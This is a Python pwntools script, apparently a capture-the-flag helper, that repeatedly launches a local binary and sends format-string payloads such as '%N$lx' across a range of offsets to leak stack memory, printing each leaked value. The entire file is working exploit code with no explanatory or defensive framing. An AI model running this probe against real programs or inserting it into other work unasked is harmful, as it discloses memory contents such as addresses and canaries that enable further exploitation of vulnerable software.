#!/usr/bin/env python3
from pwn import *
from sys import argv
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog=argv[0],
        description='leak stack via format string',
    )
    parser.add_argument('binary')
    parser.add_argument('-f', '--fmt', type=str, default='lx')

    def offset_range(v) -> range:
        try:
            s, e = map(int, v.split('-'))
            if s <= e:
                return range(s, e + 1)
            else:
                raise argparse.ArgumentTypeError(f'Invalid range: {v}')
        except ValueError:
            raise argparse.ArgumentTypeError(f'Invalid range format: {v}')

    parser.add_argument('-r', '--range', type=offset_range, default='1-10')
    args = parser.parse_args()
    context.log_level = 'CRITICAL'

    for offset in args.range:
        p = ELF(args.binary, checksec=False).process()
        p.sendline(f'%{offset}${args.fmt}'.encode())
        try:
            log.critical("Offset: %d = %s" % (
                offset,
                p.recv().split(b'\n\n')[-2],
            ))
        except Exception as e:
            print(e)
        p.close()

